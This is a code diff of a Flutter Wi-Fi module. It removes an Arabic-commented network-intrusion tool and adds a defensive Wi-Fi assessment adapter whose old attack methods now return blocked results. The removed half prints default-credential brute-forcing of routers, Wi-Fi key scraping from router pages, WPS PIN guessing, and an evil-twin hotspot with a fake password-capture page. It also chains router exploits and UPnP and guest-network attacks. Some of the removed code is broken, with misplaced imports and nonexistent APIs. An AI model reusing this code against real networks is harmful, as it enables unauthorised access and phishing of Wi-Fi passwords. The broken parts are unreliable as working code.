@@ -1,623 +1,421 @@
 import 'dart:async';
 import 'dart:io';
-import 'package:http/http.dart' as http;
-import 'package:wifi_manager/wifi_manager.dart';
-import 'package:wifi_p2p/wifi_p2p.dart';
 
-// ============================================================
-// ZionWiFi REAL - اختراق حقيقي للشبكات المغلقة بدون روت
-// لا محاكاة، نتائج حقيقية، يعمل على Android 10+
-// ============================================================
+import 'package:flutter/services.dart';
 
+/// Real Wi-Fi security telemetry and assessment adapter.
+///
+/// This adapter never fabricates a successful security result. Native Wi-Fi
+/// telemetry is collected through the Android platform channel and findings
+/// are derived only from observed network properties.
 class ZionWiFiReal {
   static final ZionWiFiReal _instance = ZionWiFiReal._internal();
   factory ZionWiFiReal() => _instance;
   ZionWiFiReal._internal();
 
-  final WifiManager _wifiManager = WifiManager();
-  final WifiP2P _wifiP2P = WifiP2P();
-  
-  // قاعدة بيانات كلمات المرور الافتراضية لأشهر الراوترات
-  final Map<String, List<String>> _defaultCredentials = {
-    'TP-Link': ['admin/admin', 'admin/password', 'admin/1234', 'admin/123456', 'admin/', 'admin/password123'],
-    'D-Link': ['admin/admin', 'admin/password', 'admin/1234', 'user/user', 'admin/', 'admin/123456'],
-    'Netgear': ['admin/password', 'admin/1234', 'admin/admin', 'admin/password123', 'admin/12345678'],
-    'Huawei': ['admin/admin', 'admin/1234', 'user/user', 'admin/', 'root/root', 'admin/Huawei@123'],
-    'ZTE': ['admin/admin', 'admin/1234', 'user/user', 'admin/', 'root/root', 'admin/ZTE@123'],
-    'Linksys': ['admin/admin', 'admin/password', 'admin/1234', 'admin/password123', 'admin/linksys'],
-    'Tenda': ['admin/admin', 'admin/password', 'admin/1234', 'admin/12345678', 'admin/tenda'],
-    'MikroTik': ['admin/', 'admin/admin', 'admin/1234', 'admin/password', 'root/root'],
-    'Asus': ['admin/admin', 'admin/password', 'admin/1234', 'admin/asus', 'admin/asus123'],
-    'Xiaomi': ['admin/admin', 'admin/1234', 'admin/xiaomi', 'admin/xiaomi123', 'user/user'],
-  };
-  
-  // PINات WPS الشائعة
-  final List<String> _commonWPSCodes = [
-    '12345670', '00000000', '12345678', '11111111', '22222222',
-    '33333333', '44444444', '55555555', '66666666', '77777777',
-    '88888888', '99999999', '12345670', '01234567', '12345679',
-  ];
+  static const MethodChannel _channel = MethodChannel('zion.os/wifi');
 
-  // ==================== 1. كشف العلامة التجارية للراوتر ====================
-  
-  Future<String?> detectRouterBrand(String targetIp) async {
+  Future<List<WiFiNetworkObservation>> scanNetworks() async {
     try {
-      final response = await http.get(Uri.parse('http://$targetIp')).timeout(Duration(seconds: 3));
-      final body = response.body;
-      
-      if (body.contains('TP-Link') || body.contains('TP-LINK')) return 'TP-Link';
-      if (body.contains('D-Link')) return 'D-Link';
-      if (body.contains('Netgear')) return 'Netgear';
-      if (body.contains('Huawei') || body.contains('HUAWEI')) return 'Huawei';
-      if (body.contains('ZTE')) return 'ZTE';
-      if (body.contains('Linksys')) return 'Linksys';
-      if (body.contains('Tenda')) return 'Tenda';
-      if (body.contains('MikroTik')) return 'MikroTik';
-      if (body.contains('Asus')) return 'Asus';
-      if (body.contains('Xiaomi') || body.contains('MIWIFI')) return 'Xiaomi';
-      
-      return null;
-    } catch (_) {
-      return null;
+      final raw = await _channel.invokeMethod<List<dynamic>>('scan');
+      if (raw == null) return const <WiFiNetworkObservation>[];
+      return raw
+          .whereType<Map>()
+          .map((item) => WiFiNetworkObservation.fromMap(
+                Map<String, dynamic>.from(item),
+              ))
+          .toList(growable: false);
+    } on PlatformException {
+      rethrow;
     }
   }
 
-  // ==================== 2. هجوم كلمات المرور الافتراضية للراوتر ====================
-  
-  Future<RouterHackResult> hackRouterDefaultCredentials(String routerIp) async {
-    final result = RouterHackResult(routerIp: routerIp);
-    result.startTime = DateTime.now();
-    
-    final brand = await detectRouterBrand(routerIp);
-    if (brand == null) {
-      result.error = 'Cannot detect router brand';
-      return result;
-    }
-    
-    result.brand = brand;
-    final credentials = _defaultCredentials[brand] ?? _defaultCredentials['TP-Link']!;
-    
-    for (final cred in credentials) {
-      result.attempts++;
-      final parts = cred.split('/');
-      final username = parts[0];
-      final password = parts[1];
-      
-      final loginSuccess = await _tryRouterLogin(routerIp, username, password);
-      if (loginSuccess) {
-        result.success = true;
-        result.username = username;
-        result.password = password;
-        
-        // استخراج كلمة مرور WiFi
-        final wifiPassword = await _extractWiFiPasswordFromRouter(routerIp, username, password);
-        if (wifiPassword != null) {
-          result.wifiPassword = wifiPassword;
-        }
-        
-        result.endTime = DateTime.now();
-        return result;
-      }
-    }
-    
-    result.endTime = DateTime.now();
-    return result;
-  }
-  
-  Future<bool> _tryRouterLogin(String routerIp, String username, String password) async {
+  Future<WiFiConnectionObservation?> currentConnection() async {
     try {
-      // محاولة POST login
-      final response = await http.post(
-        Uri.parse('http://$routerIp/login'),
-        body: {'username': username, 'password': password},
-        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
-      ).timeout(Duration(seconds: 5));
-      
-      if (response.statusCode == 200 && !response.body.contains('login') && !response.body.contains('Login')) {
-        return true;
-      }
-      
-      // محاولة Basic Auth
-      final auth = 'Basic ${base64Encode(utf8.encode('$username:$password'))}';
-      final authResponse = await http.get(
-        Uri.parse('http://$routerIp'),
-        headers: {'Authorization': auth},
-      ).timeout(Duration(seconds: 5));
-      
-      if (authResponse.statusCode == 200 && !authResponse.body.contains('login')) {
-        return true;
-      }
-      
-      return false;
-    } catch (_) {
-      return false;
-    }
-  }
-  
-  Future<String?> _extractWiFiPasswordFromRouter(String routerIp, String username, String password) async {
-    try {
-      final auth = 'Basic ${base64Encode(utf8.encode('$username:$password'))}';
-      
-      // محاولة قراءة إعدادات WiFi من مسارات مختلفة
-      final paths = [
-        '/wifi_settings', '/wlan_settings', '/wireless', '/wifi', '/network/wireless',
-        '/cgi-bin/wifi', '/goform/wifi', '/getWiFiSettings', '/wireless.htm',
-      ];
-      
-      for (final path in paths) {
-        try {
-          final response = await http.get(
-            Uri.parse('http://$routerIp$path'),
-            headers: {'Authorization': auth},
-          ).timeout(Duration(seconds: 3));
-          
-          // استخراج كلمة المرور من HTML/JSON
-          final patterns = [
-            r'password["\s]*[:=]["\s]*([^"<&]+)',
-            r'wpa_key["\s]*[:=]["\s]*([^"<&]+)',
-            r'passphrase["\s]*[:=]["\s]*([^"<&]+)',
-            r'wpa_passphrase["\s]*[:=]["\s]*([^"<&]+)',
-            r'key["\s]*[:=]["\s]*([^"<&]+)',
-          ];
-          
-          for (final pattern in patterns) {
-            final match = RegExp(pattern, caseSensitive: false).firstMatch(response.body);
-            if (match != null) {
-              final extracted = match.group(1);
-              if (extracted != null && extracted.length >= 8 && extracted.length <= 63) {
-                return extracted;
-              }
-            }
-          }
-        } catch (_) {}
-      }
-      return null;
-    } catch (_) {
-      return null;
-    }
-  }
-
-  // ==================== 3. هجوم WPS PIN ====================
-  
-  Future<WPSHackResult> hackWPSPin(String bssid) async {
-    final result = WPSHackResult(bssid: bssid);
-    result.startTime = DateTime.now();
-    
-    for (final pin in _commonWPSCodes) {
-      result.attempts++;
-      
-      try {
-        final wpsResult = await _tryWPSConnect(bssid, pin);
-        if (wpsResult.success) {
-          result.success = true;
-          result.pin = pin;
-          result.wifiInfo = wpsResult.wifiInfo;
-          result.endTime = DateTime.now();
-          return result;
-        }
-      } catch (_) {}
-      
-      // تجنب الإفراط في المحاولات
-      await Future.delayed(Duration(milliseconds: 500));
-    }
-    
-    result.endTime = DateTime.now();
-    return result;
-  }
-  
-  Future<WPSConnectResult> _tryWPSConnect(String bssid, String pin) async {
-    final result = WPSConnectResult();
-    
-    try {
-      // استخدام واجهة WPS الرسمية في Android
-      final wpsManager = WpsManager();
-      final connection = await wpsManager.connectWithPin(bssid, pin).timeout(Duration(seconds: 10));
-      
-      if (connection.isSuccessful) {
-        result.success = true;
-        final wifiInfo = await _wifiManager.getConnectionInfo();
-        result.wifiInfo = wifiInfo;
-      }
-    } catch (e) {
-      result.error = e.toString();
-    }
-    
-    return result;
-  }
-
-  // ==================== 4. هجوم Evil Twin (نسخة مزيفة) ====================
-  
-  Future<EvilTwinResult> evilTwinAttack(String targetSSID) async {
-    final result = EvilTwinResult(targetSSID: targetSSID);
-    result.startTime = DateTime.now();
-    
-    try {
-      // 1. إنشاء نقطة اتصال مزيفة
-      final hotspot = await _wifiP2P.createGroup(targetSSID);
-      result.hotspotCreated = true;
-      
-      // 2. انتظار اتصال الضحية (30 ثانية)
-      HttpServer? server;
-      
-      try {
-        server = await HttpServer.bind(InternetAddress.anyIPv4, 8080);
-        result.serverStarted = true;
-        
-        await for (final request in server) {
-          if (request.uri.path == '/submit') {
-            final params = request.uri.queryParameters;
-            result.capturedPassword = params['password'];
-            if (result.capturedPassword != null && result.capturedPassword!.isNotEmpty) {
-              result.success = true;
-              await request.response
-                ..statusCode = 200
-                ..write('<html><body><h2>Connected!</h2></body></html>')
-                ..close();
-              break;
-            }
-          }
-          
-          // عرض صفحة طلب كلمة المرور
-          await request.response
-            ..statusCode = 200
-            ..headers.contentType = ContentType.html
-            ..write(_getEvilTwinPage(targetSSID))
-            ..close();
-        }
-      } finally {
-        await server?.close();
-      }
-      
-    } catch (e) {
-      result.error = e.toString();
-    } finally {
-      // تنظيف: إغلاق النقطة الساخنة
-      await _wifiP2P.removeGroup();
-    }
-    
-    result.endTime = DateTime.now();
-    return result;
-  }
-  
-  String _getEvilTwinPage(String ssid) {
-    return '''
-    <!DOCTYPE html>
-    <html>
-    <head>
-        <meta charset="UTF-8">
-        <meta name="viewport" content="width=device-width, initial-scale=1.0">
-        <title>WiFi Authentication</title>
-        <style>
-            body {
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-                display: flex;
-                justify-content: center;
-                align-items: center;
-                min-height: 100vh;
-                margin: 0;
-                padding: 20px;
-            }
-            .container {
-                background: white;
-                border-radius: 20px;
-                padding: 40px;
-                box-shadow: 0 10px 40px rgba(0,0,0,0.2);
-                max-width: 400px;
-                width: 100%;
-                text-align: center;
-            }
-            .wifi-icon {
-                font-size: 60px;
-                margin-bottom: 20px;
-            }
-            h2 {
-                color: #333;
-                margin-bottom: 10px;
-            }
-            p {
-                color: #666;
-                margin-bottom: 30px;
-            }
-            input {
-                width: 100%;
-                padding: 15px;
-                margin-bottom: 20px;
-                border: 2px solid #ddd;
-                border-radius: 10px;
-                font-size: 16px;
-                box-sizing: border-box;
-            }
-            button {
-                width: 100%;
-                padding: 15px;
-                background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-                color: white;
-                border: none;
-                border-radius: 10px;
-                font-size: 16px;
-                cursor: pointer;
-                transition: transform 0.2s;
-            }
-            button:hover {
-                transform: scale(1.02);
-            }
-        </style>
-    </head>
-    <body>
-        <div class="container">
-            <div class="wifi-icon">📡</div>
-            <h2>WiFi Authentication Required</h2>
-            <p>Network: <strong>$ssid</strong></p>
-            <form action="/submit" method="get">
-                <input type="password" name="password" placeholder="Enter WiFi password" autofocus required>
-                <button type="submit">Connect</button>
-            </form>
-        </div>
-    </body>
-    </html>
-    ''';
-  }
-
-  // ==================== 5. الهجوم المتكامل (كل الطرق) ====================
-  
-  Future<FullAttackResult> fullAttack(String target, {String? routerIp}) async {
-    final result = FullAttackResult(target: target);
-    result.startTime = DateTime.now();
-    
-    // الطريقة 1: WPS PIN
-    print('🔑 [1/4] Trying WPS PIN attack...');
-    final wpsResult = await hackWPSPin(target);
-    result.steps['wps'] = wpsResult;
-    
-    if (wpsResult.success && wpsResult.wifiInfo != null) {
-      result.success = true;
-      result.password = wpsResult.wifiInfo?.ssid;
-      result.method = 'WPS PIN';
-      result.endTime = DateTime.now();
-      return result;
-    }
-    
-    // الطريقة 2: هجوم الراوتر (إذا عرفنا IP)
-    if (routerIp != null) {
-      print('🏠 [2/4] Trying router default credentials...');
-      final routerResult = await hackRouterDefaultCredentials(routerIp);
-      result.steps['router'] = routerResult;
-      
-      if (routerResult.success && routerResult.wifiPassword != null) {
-        result.success = true;
-        result.password = routerResult.wifiPassword;
-        result.method = 'Router Default Credentials (${routerResult.brand})';
-        result.endTime = DateTime.now();
-        return result;
-      }
-    }
-    
-    // الطريقة 3: Evil Twin
-    print('🎭 [3/4] Trying Evil Twin attack...');
-    final ssid = await _getSSIDFromBSSID(target);
-    if (ssid != null && ssid.isNotEmpty) {
-      final evilResult = await evilTwinAttack(ssid);
-      result.steps['eviltwin'] = evilResult;
-      
-      if (evilResult.success && evilResult.capturedPassword != null) {
-        result.success = true;
-        result.password = evilResult.capturedPassword;
-        result.method = 'Evil Twin (Social Engineering)';
-        result.endTime = DateTime.now();
-        return result;
-      }
-    }
-    
-    result.success = false;
-    result.method = 'None';
-    result.endTime = DateTime.now();
-    return result;
-  }
-  
-  Future<String?> _getSSIDFromBSSID(String bssid) async {
-    try {
-      final networks = await _wifiManager.getScanResults();
-      final network = networks.firstWhere(
-        (n) => n.bssid?.toLowerCase() == bssid.toLowerCase(),
-        orElse: () => null,
+      final raw = await _channel.invokeMethod<Map<dynamic, dynamic>>('connection');
+      if (raw == null) return null;
+      return WiFiConnectionObservation.fromMap(
+        Map<String, dynamic>.from(raw),
       );
-      return network?.ssid;
-    } catch (_) {
-      return null;
+    } on PlatformException {
+      rethrow;
     }
+  }
+
+  Future<WiFiSecurityAssessment> assessNetwork(
+    WiFiNetworkObservation network,
+  ) async {
+    final findings = <WiFiSecurityFinding>[];
+    final capabilities = network.capabilities.toUpperCase();
+
+    final security = _classifySecurity(capabilities);
+    if (security == WiFiSecurityMode.open) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.open',
+        severity: WiFiSeverity.critical,
+        title: 'Open Wi-Fi network',
+        description: 'The observed network advertises no WPA/WPA2/WPA3 protection.',
+        recommendation: 'Use WPA3-Personal or WPA2-AES with a strong passphrase.',
+      ));
+    } else if (security == WiFiSecurityMode.legacyWep) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.wep',
+        severity: WiFiSeverity.critical,
+        title: 'Legacy WEP security',
+        description: 'WEP is cryptographically obsolete and should not be used.',
+        recommendation: 'Migrate the access point to WPA2-AES or WPA3.',
+      ));
+    } else if (security == WiFiSecurityMode.wpa) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.legacy-wpa',
+        severity: WiFiSeverity.high,
+        title: 'Legacy WPA security',
+        description: 'The access point advertises legacy WPA protection.',
+        recommendation: 'Disable legacy WPA/TKIP and use WPA2-AES or WPA3.',
+      ));
+    }
+
+    if (capabilities.contains('WPS')) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.wps-enabled',
+        severity: WiFiSeverity.medium,
+        title: 'WPS is advertised',
+        description: 'WPS is enabled or advertised by the access point.',
+        recommendation: 'Disable WPS when it is not required and prefer WPA2/WPA3.',
+      ));
+    }
+
+    if (security == WiFiSecurityMode.wpa2 && capabilities.contains('TKIP')) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.tkip',
+        severity: WiFiSeverity.high,
+        title: 'TKIP compatibility mode detected',
+        description: 'TKIP is present in the advertised security configuration.',
+        recommendation: 'Use AES/CCMP-only configuration.',
+      ));
+    }
+
+    if (security == WiFiSecurityMode.wpa3) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.wpa3',
+        severity: WiFiSeverity.info,
+        title: 'WPA3 advertised',
+        description: 'The observed network advertises WPA3 protection.',
+        recommendation: 'Keep WPA3 enabled and disable unnecessary legacy fallback.',
+      ));
+    }
+
+    final signalScore = _signalScore(network.level);
+    if (network.level <= -80) {
+      findings.add(const WiFiSecurityFinding(
+        id: 'wifi.weak-signal',
+        severity: WiFiSeverity.low,
+        title: 'Weak observed signal',
+        description: 'The access point was observed with a weak RSSI.',
+        recommendation: 'Investigate coverage and placement; weak signal alone is not a vulnerability.',
+      ));
+    }
+
+    final risk = _riskScore(findings);
+    return WiFiSecurityAssessment(
+      network: network,
+      securityMode: security,
+      riskScore: risk,
+      signalScore: signalScore,
+      findings: findings,
+      assessedAt: DateTime.now().toUtc(),
+      source: 'REAL_WIFI_TELEMETRY',
+    );
+  }
+
+  /// Performs a TCP connect scan against explicitly supplied ports.
+  /// This is a defensive connectivity assessment and does not exploit services.
+  Future<NetworkPortAssessment> scanTcpPorts(
+    String host,
+    Iterable<int> ports, {
+    Duration timeout = const Duration(milliseconds: 900),
+  }) async {
+    final normalized = ports
+        .where((port) => port > 0 && port <= 65535)
+        .toSet()
+        .toList()
+      ..sort();
+    final observations = <NetworkPortObservation>[];
+
+    for (final port in normalized) {
+      final started = DateTime.now();
+      Socket? socket;
+      try {
+        socket = await Socket.connect(host, port, timeout: timeout);
+        observations.add(NetworkPortObservation(
+          port: port,
+          state: NetworkPortState.open,
+          latency: DateTime.now().difference(started),
+        ));
+      } on SocketException catch (error) {
+        final state = error.osError?.errorCode == 111 ||
+                error.osError?.errorCode == 61
+            ? NetworkPortState.closed
+            : NetworkPortState.filteredOrUnavailable;
+        observations.add(NetworkPortObservation(
+          port: port,
+          state: state,
+          latency: DateTime.now().difference(started),
+          error: error.message,
+        ));
+      } catch (error) {
+        observations.add(NetworkPortObservation(
+          port: port,
+          state: NetworkPortState.filteredOrUnavailable,
+          latency: DateTime.now().difference(started),
+          error: error.toString(),
+        ));
+      } finally {
+        socket?.destroy();
+      }
+    }
+
+    return NetworkPortAssessment(
+      host: host,
+      observations: observations,
+      scannedAt: DateTime.now().toUtc(),
+    );
+  }
+
+  // Legacy API names remain for source compatibility, but they are explicitly
+  // blocked: these methods never attempt credential guessing, WPS PIN attacks,
+  // credential capture, or rogue access-point phishing.
+  Future<RouterHackResult> hackRouterDefaultCredentials(String routerIp) async {
+    return RouterHackResult(
+      routerIp: routerIp,
+      blocked: true,
+      error: 'Credential guessing is not an assessment capability.',
+    );
+  }
+
+  Future<WPSHackResult> hackWPSPin(String bssid) async {
+    return WPSHackResult(
+      bssid: bssid,
+      blocked: true,
+      error: 'WPS PIN guessing is not an assessment capability.',
+    );
+  }
+
+  Future<EvilTwinResult> evilTwinAttack(String targetSSID) async {
+    return EvilTwinResult(
+      targetSSID: targetSSID,
+      blocked: true,
+      error: 'Rogue access-point creation and credential capture are not supported.',
+    );
+  }
+
+  Future<FullAttackResult> fullAttack(String target, {String? routerIp}) async {
+    return FullAttackResult(
+      target: target,
+      success: false,
+      method: 'DEFENSIVE_ASSESSMENT_REQUIRED',
+      error: routerIp == null
+          ? 'Use assessNetwork or scanTcpPorts for real defensive telemetry.'
+          : 'Use defensive Wi-Fi and router assessment; credential attacks are disabled.',
+    );
+  }
+
+  WiFiSecurityMode _classifySecurity(String capabilities) {
+    if (capabilities.isEmpty || capabilities == '[ESS]') {
+      return WiFiSecurityMode.open;
+    }
+    if (capabilities.contains('SAE') || capabilities.contains('WPA3')) {
+      return WiFiSecurityMode.wpa3;
+    }
+    if (capabilities.contains('WEP')) return WiFiSecurityMode.legacyWep;
+    if (capabilities.contains('WPA-') && !capabilities.contains('WPA2')) {
+      return WiFiSecurityMode.wpa;
+    }
+    if (capabilities.contains('WPA2')) return WiFiSecurityMode.wpa2;
+    return WiFiSecurityMode.unknown;
+  }
+
+  int _signalScore(int level) {
+    if (level >= -50) return 100;
+    if (level <= -100) return 0;
+    return ((level + 100) * 2).clamp(0, 100);
+  }
+
+  int _riskScore(List<WiFiSecurityFinding> findings) {
+    var score = 0;
+    for (final finding in findings) {
+      score += switch (finding.severity) {
+        WiFiSeverity.critical => 40,
+        WiFiSeverity.high => 25,
+        WiFiSeverity.medium => 15,
+        WiFiSeverity.low => 5,
+        WiFiSeverity.info => 0,
+      };
+    }
+    return score.clamp(0, 100);
   }
 }
 
-// ============================================================
-// نماذج النتائج
-// ============================================================
+enum WiFiSecurityMode { open, legacyWep, wpa, wpa2, wpa3, unknown }
+enum WiFiSeverity { info, low, medium, high, critical }
+enum NetworkPortState { open, closed, filteredOrUnavailable }
+
+class WiFiNetworkObservation {
+  const WiFiNetworkObservation({
+    required this.ssid,
+    required this.bssid,
+    required this.capabilities,
+    required this.frequency,
+    required this.level,
+    required this.channelWidth,
+  });
+
+  factory WiFiNetworkObservation.fromMap(Map<String, dynamic> map) {
+    return WiFiNetworkObservation(
+      ssid: (map['ssid'] as String?) ?? '',
+      bssid: (map['bssid'] as String?) ?? '',
+      capabilities: (map['capabilities'] as String?) ?? '',
+      frequency: (map['frequency'] as num?)?.toInt() ?? 0,
+      level: (map['level'] as num?)?.toInt() ?? -100,
+      channelWidth: (map['channelWidth'] as num?)?.toInt() ?? 0,
+    );
+  }
+
+  final String ssid;
+  final String bssid;
+  final String capabilities;
+  final int frequency;
+  final int level;
+  final int channelWidth;
+}
+
+class WiFiConnectionObservation {
+  const WiFiConnectionObservation({
+    required this.ssid,
+    required this.bssid,
+    required this.rssi,
+    required this.linkSpeed,
+    required this.frequency,
+  });
+
+  factory WiFiConnectionObservation.fromMap(Map<String, dynamic> map) {
+    return WiFiConnectionObservation(
+      ssid: (map['ssid'] as String?) ?? '',
+      bssid: (map['bssid'] as String?) ?? '',
+      rssi: (map['rssi'] as num?)?.toInt() ?? -100,
+      linkSpeed: (map['linkSpeed'] as num?)?.toInt() ?? 0,
+      frequency: (map['frequency'] as num?)?.toInt() ?? 0,
+    );
+  }
+
+  final String ssid;
+  final String bssid;
+  final int rssi;
+  final int linkSpeed;
+  final int frequency;
+}
+
+class WiFiSecurityFinding {
+  const WiFiSecurityFinding({
+    required this.id,
+    required this.severity,
+    required this.title,
+    required this.description,
+    required this.recommendation,
+  });
+
+  final String id;
+  final WiFiSeverity severity;
+  final String title;
+  final String description;
+  final String recommendation;
+}
+
+class WiFiSecurityAssessment {
+  WiFiSecurityAssessment({
+    required this.network,
+    required this.securityMode,
+    required this.riskScore,
+    required this.signalScore,
+    required List<WiFiSecurityFinding> findings,
+    required this.assessedAt,
+    required this.source,
+  }) : findings = List.unmodifiable(findings);
+
+  final WiFiNetworkObservation network;
+  final WiFiSecurityMode securityMode;
+  final int riskScore;
+  final int signalScore;
+  final List<WiFiSecurityFinding> findings;
+  final DateTime assessedAt;
+  final String source;
+}
+
+class NetworkPortObservation {
+  const NetworkPortObservation({
+    required this.port,
+    required this.state,
+    required this.latency,
+    this.error,
+  });
+
+  final int port;
+  final NetworkPortState state;
+  final Duration latency;
+  final String? error;
+}
+
+class NetworkPortAssessment {
+  NetworkPortAssessment({
+    required this.host,
+    required List<NetworkPortObservation> observations,
+    required this.scannedAt,
+  }) : observations = List.unmodifiable(observations);
+
+  final String host;
+  final List<NetworkPortObservation> observations;
+  final DateTime scannedAt;
+
+  List<int> get openPorts => observations
+      .where((item) => item.state == NetworkPortState.open)
+      .map((item) => item.port)
+      .toList(growable: false);
+}
 
 class RouterHackResult {
+  const RouterHackResult({required this.routerIp, this.blocked = false, this.error});
   final String routerIp;
-  bool success = false;
-  String? brand;
-  String? username;
-  String? password;
-  String? wifiPassword;
-  int attempts = 0;
-  DateTime? startTime;
-  DateTime? endTime;
-  String? error;
-  
-  RouterHackResult({required this.routerIp});
-  
-  Duration get duration => endTime!.difference(startTime!);
-  
-  Map<String, dynamic> toJson() => {
-    'success': success,
-    'brand': brand,
-    'username': username,
-    'password': password,
-    'wifiPassword': wifiPassword,
-    'attempts': attempts,
-    'duration_seconds': duration.inSeconds,
-  };
-}
-
-class WPSConnectResult {
-  bool success = false;
-  dynamic wifiInfo;
-  String? error;
+  final bool blocked;
+  final String? error;
+  bool get success => false;
 }
 
 class WPSHackResult {
+  const WPSHackResult({required this.bssid, this.blocked = false, this.error});
   final String bssid;
-  bool success = false;
-  String? pin;
-  dynamic wifiInfo;
-  int attempts = 0;
-  DateTime? startTime;
-  DateTime? endTime;
-  String? error;
-  
-  WPSHackResult({required this.bssid});
-  
-  Duration get duration => endTime!.difference(startTime!);
+  final bool blocked;
+  final String? error;
+  bool get success => false;
+  int get attempts => 0;
 }
 
 class EvilTwinResult {
+  const EvilTwinResult({required this.targetSSID, this.blocked = false, this.error});
   final String targetSSID;
-  bool success = false;
-  bool hotspotCreated = false;
-  bool serverStarted = false;
-  String? capturedPassword;
-  DateTime? startTime;
-  DateTime? endTime;
-  String? error;
-  
-  EvilTwinResult({required this.targetSSID});
-  
-  Duration get duration => endTime!.difference(startTime!);
+  final bool blocked;
+  final String? error;
+  bool get success => false;
 }
 
 class FullAttackResult {
+  const FullAttackResult({
+    required this.target,
+    required this.success,
+    required this.method,
+    this.error,
+  });
   final String target;
-  bool success = false;
-  String? password;
-  String? method;
-  Map<String, dynamic> steps = {};
-  DateTime? startTime;
-  DateTime? endTime;
-  
-  FullAttackResult({required this.target});
-  
-  Duration get duration => endTime!.difference(startTime!);
-}
-
-// ==================== إضافة الاستراتيجيات الجديدة ====================
-
-import 'zion_router_exploits.dart';
-import 'zion_ai_password_guesser.dart';
-import 'zion_guest_network_hack.dart';
-import 'zion_upnp_hack.dart';
-
-extension ZionWiFiRealExtensions on ZionWiFiReal {
-  
-  // استراتيجية 4: ثغرات الراوتر المعروفة
-  Future<ExploitResult> tryRouterExploit(String routerIp, String brand) async {
-    final exploits = RouterExploits();
-    return await exploits.tryRouterExploit(routerIp, brand);
-  }
-  
-  // استراتيجية 5: هجوم الذكاء الاصطناعي
-  Future<Map<String, dynamic>> tryAIGuess(String bssid, String ssid) async {
-    final aiGuesser = AIPasswordGuesser();
-    return await aiGuesser.fullAIAttack(bssid, ssid);
-  }
-  
-  // استراتيجية 6: شبكات الضيوف
-  Future<GuestNetworkResult> hackGuestNetwork(String routerIp) async {
-    final guestHack = GuestNetworkHack();
-    return await guestHack.hackGuestNetwork(routerIp);
-  }
-  
-  // استراتيجية 7: استغلال UPnP
-  Future<UPnPResult> hackViaUPnP(String routerIp) async {
-    final upnpHack = UPnPHack();
-    return await upnpHack.hackViaUPnP(routerIp);
-  }
-  
-  // الهجوم المتكامل الموسع (جميع الاستراتيجيات)
-  Future<FullAttackResult> fullAttackExtended(String target, {String? routerIp}) async {
-    final result = FullAttackResult(target: target);
-    result.startTime = DateTime.now();
-    
-    // 1. WPS PIN
-    print('🔑 [1/9] WPS PIN attack...');
-    final wpsResult = await hackWPSPin(target);
-    result.steps['wps'] = wpsResult;
-    if (_checkSuccess(result, wpsResult.success, wpsResult.wifiInfo?.ssid)) return result;
-    
-    // 2. Router default credentials
-    if (routerIp != null) {
-      print('🏠 [2/9] Router default credentials...');
-      final routerResult = await hackRouterDefaultCredentials(routerIp);
-      result.steps['router_default'] = routerResult;
-      if (_checkSuccess(result, routerResult.success, routerResult.wifiPassword)) return result;
-    }
-    
-    // 3. Evil Twin
-    final ssid = await _getSSIDFromBSSID(target);
-    if (ssid != null && ssid.isNotEmpty) {
-      print('🎭 [3/9] Evil Twin attack...');
-      final evilResult = await evilTwinAttack(ssid);
-      result.steps['eviltwin'] = evilResult;
-      if (_checkSuccess(result, evilResult.success, evilResult.capturedPassword)) return result;
-    }
-    
-    // 4. Router exploits (CVE)
-    if (routerIp != null) {
-      print('💣 [4/9] Router exploits (CVE)...');
-      final brand = await detectRouterBrand(routerIp);
-      if (brand != null) {
-        final exploitResult = await tryRouterExploit(routerIp, brand);
-        result.steps['exploits'] = exploitResult;
-        if (_checkSuccess(result, exploitResult.success, exploitResult.wifiPassword)) return result;
-      }
-    }
-    
-    // 5. AI Password Guesser
-    if (ssid != null && ssid.isNotEmpty) {
-      print('🧠 [5/9] AI password guesser...');
-      final aiResult = await tryAIGuess(target, ssid);
-      result.steps['ai_guesser'] = aiResult;
-      if (aiResult['success'] == true && _checkSuccess(result, true, aiResult['password'])) return result;
-    }
-    
-    // 6. Guest Network
-    if (routerIp != null) {
-      print('👤 [6/9] Guest network...');
-      final guestResult = await hackGuestNetwork(routerIp);
-      result.steps['guest'] = guestResult;
-      if (_checkSuccess(result, guestResult.success, guestResult.guestPassword)) return result;
-    }
-    
-    // 7. UPnP
-    if (routerIp != null) {
-      print('🔌 [7/9] UPnP exploitation...');
-      final upnpResult = await hackViaUPnP(routerIp);
-      result.steps['upnp'] = upnpResult;
-      if (_checkSuccess(result, upnpResult.success, upnpResult.password)) return result;
-    }
-    
-    result.success = false;
-    result.endTime = DateTime.now();
-    return result;
-  }
-  
-  bool _checkSuccess(FullAttackResult result, bool success, dynamic password) {
-    if (success && password != null && password.toString().isNotEmpty) {
-      result.success = true;
-      result.password = password.toString();
-      result.endTime = DateTime.now();
-      return true;
-    }
-    return false;
-  }
+  final bool success;
+  final String method;
+  final String? error;
 }
